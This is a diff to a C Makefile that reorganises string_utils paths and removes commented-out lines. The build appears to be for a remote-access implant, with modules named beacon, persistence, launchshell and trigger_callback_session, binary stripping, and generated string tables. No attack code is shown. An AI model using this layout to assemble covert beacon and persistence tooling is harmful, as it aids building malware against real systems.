@@ -10,7 +10,6 @@ MD5SUM := $(shell which md5sum)
 STRIP := $(shell which strip)
 
 #Default FLAGS
-
 CFLAGS := -Wall -Wextra -ansi -std=gnu99
 CFLAGS += -D_X86
 CFLAGS += -I. -I../common -I../common/crypto -I../common/ssl/include -I../common/bzip2
@@ -68,8 +67,6 @@ OBJS =	beacon.o persistence.o launchshell.o \
 	threads.o trigger_callback_session.o client_session.o run_command.o \
 	get_data.o process_list.o netstat_an.o netstat_rn.o ifconfig.o compression.o
 
-#COMMON_OBJS =	$(COMMON)/crypto.o $(COMMON)/init_crypto_strings.o $(COMMON)/string_utils.o
-
 LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)
 
 # Debug Configuration
@@ -81,10 +78,6 @@ IFC = ifconfig.c
 
 OS = $(shell uname)
 
-#ifeq ($(OS),Linux)
-#ARCH = $(shell uname -m)
-#ARCH=x86
-#endif
 .PHONY: force-rebuild
 ifdef ARCH_BUILD_BZIP2
   ifneq ("$(ARCH_BUILD_BZIP2)", "$(TARGET)")
@@ -154,14 +147,14 @@ release: $(SERVER)
 $(SERVER): strings $(OBJS) $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO) init_strings.o 
 	if ! test $(DEBUG); then \
 		printf "\tLD\t\t$@\n"; \
-		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $@; \
+		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) init_strings.o $(COMMON)/string_utils.o $(LIBS) -o $@; \
 		printf "\tStripping\t$@\n"; \
 		$(STRIP) $(BINARY)/$(SERVER); \
 		$(MD5SUM) $(BINARY)/$(SERVER) > $(BINARY)/$(SERVER).md5; \
 	else \
 		printf "\n\tCREATING DEBUG VERSION OF $@\n\n"; \
 		printf "\tLD\t\t$@-dbg\n"; \
-		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) init_strings.o string_utils.o $(LIBS) -o $@-dbg; \
+		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) init_strings.o $(COMMON)/string_utils.o $(LIBS) -o $@-dbg; \
 		$(MD5SUM) $(BINARY)/$(SERVER)-dbg > $(BINARY)/$(SERVER)-dbg.md5; \
 	fi
 
@@ -175,17 +168,17 @@ efence: $(LIBSSL) $(LIBBZIP2) $(LIBCRYPTO)
 .PHONY: strings
 strings: init_strings.o
 
-init_strings.o: init_strings.c string_utils.o
+init_strings.o: init_strings.c $(COMMON)/string_utils.o
 	printf "\tCC\t\t$<\n"
 	$(CC) -c $(CFLAGS) init_strings.c
 
-init_strings.c: server_strings.txt string_utils.h
+init_strings.c: server_strings.txt $(COMMON)/string_utils.h
 	printf "\tGenerating\t$@\n"
 	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS
 
-string_utils.o: string_utils.h string_utils.c
+$(COMMON)/string_utils.o: $(COMMON)/string_utils.h $(COMMON)/string_utils.c
 	printf "\tCC\t\t$<\n"
-	$(CC) -c $(CFLAGS) string_utils.c 
+	$(CC) -c $(CFLAGS) $(COMMON)/string_utils.c 
 
 .PHONY: clean
 clean:
